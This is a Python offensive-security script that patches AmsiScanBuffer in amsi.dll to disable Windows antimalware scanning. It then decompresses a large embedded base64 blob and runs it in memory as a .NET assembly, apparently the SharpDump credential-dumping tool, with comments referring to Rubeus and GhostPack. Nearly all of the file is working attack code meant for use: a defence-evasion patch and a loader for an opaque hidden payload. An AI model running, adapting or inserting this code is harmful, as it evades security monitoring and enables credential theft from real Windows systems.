import base64
import zlib
import argparse
import clr
import ctypes
from ctypes import *
import System
from System import Array, IntPtr, UInt32
from System.Reflection import Assembly
import System.Reflection as Reflection

# Ensure necessary .NET references are added
clr.AddReference("System.Management.Automation")

from System.Management.Automation import Runspaces, RunspaceInvoke
from System.Runtime.InteropServices import Marshal

base64_str = "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"


def bypass():
    """
    Bypasses the Antimalware Scan Interface (AMSI) by patching the AmsiScanBuffer method in amsi.dll.
    This allows scripts to run without being scanned and potentially blocked by AMSI.
    """
    windll.LoadLibrary("amsi.dll")
    windll.kernel32.GetModuleHandleW.argtypes = [c_wchar_p]
    windll.kernel32.GetModuleHandleW.restype = c_void_p
    handle = windll.kernel32.GetModuleHandleW('amsi.dll')
    windll.kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]
    windll.kernel32.GetProcAddress.restype = c_void_p
    BufferAddress = windll.kernel32.GetProcAddress(handle, "AmsiScanBuffer")
    BufferAddress = IntPtr(BufferAddress)
    Size = System.UInt32(0x05)
    ProtectFlag = System.UInt32(0x40)
    OldProtectFlag = Marshal.AllocHGlobal(0)
    virt_prot = windll.kernel32.VirtualProtect(BufferAddress, Size, ProtectFlag, OldProtectFlag)
    patch = System.Array[System.Byte]((System.UInt32(0xB8), System.UInt32(0x57), System.UInt32(0x00), System.UInt32(0x07), System.UInt32(0x80), System.UInt32(0xC3)))
    Marshal.Copy(patch, 0, BufferAddress, 6)

def base64_to_bytes(base64_string):
    """
    Converts a base64 encoded string to a .NET byte array after decompressing it.
    Args:
        base64_string: The base64 encoded and compressed string to convert.
    Returns:
        A .NET byte array of the decompressed data.
    """
    # Decode the base64 string to get the compressed binary data
    compressed_data = base64.b64decode(base64_string)
    # Decompress the data
    decompressed_data = zlib.decompress(compressed_data)
    # Convert the decompressed binary data to a .NET byte array
    return System.Array[System.Byte](decompressed_data)

def load_and_execute_assembly(command):
    """
    Loads a .NET assembly from a base64 encoded and compressed string, and executes a specified method.
    Args:
        command: The command to execute within the loaded assembly.
    Returns:
        The result of the executed command.
    """
    
    assembly_bytes = base64_to_bytes(base64_str)
    
    # Load the assembly
    assembly = Assembly.Load(assembly_bytes)
    
    # Get the type of the Rubeus.Program class
    program_type = assembly.GetType("SharpDump.Program")
    # You don't need to create an instance of the class for a static method
    method = program_type.GetMethod("MainString")
    #Have to do this nesting thing to deal with different main entry points and public/private methods  
    if method == None:
        method =program_type.GetMethod("Main")
        if method == None:
            method = program_type.GetMethod("Main",Reflection.BindingFlags.NonPublic | Reflection.BindingFlags.Static)
        # Create a jagged array to pass in an array of string arrays to satisfy arguments requirements
        command_array = Array[str]([command])
        command_args = System.Array[System.Object]([command_array])
    else:
        #Ghost Pack stuff like rubeus use a different input
        command_args = Array[str]([command]) 

    # Invoke the MainString method
    result = method.Invoke(None, command_args)

    return result
    
def main():
    bypass()
    parser = argparse.ArgumentParser(description='Execute a command on a hardcoded base64 encoded assembly')
    parser.add_argument('command', type=str, nargs='?', default="", 
                        help='Command to execute (like "help" or "triage"). If not specified, a default command is executed.')

    args = parser.parse_args()
    
    result = load_and_execute_assembly(args.command)
    print(result)

if __name__ == "__main__":
    main()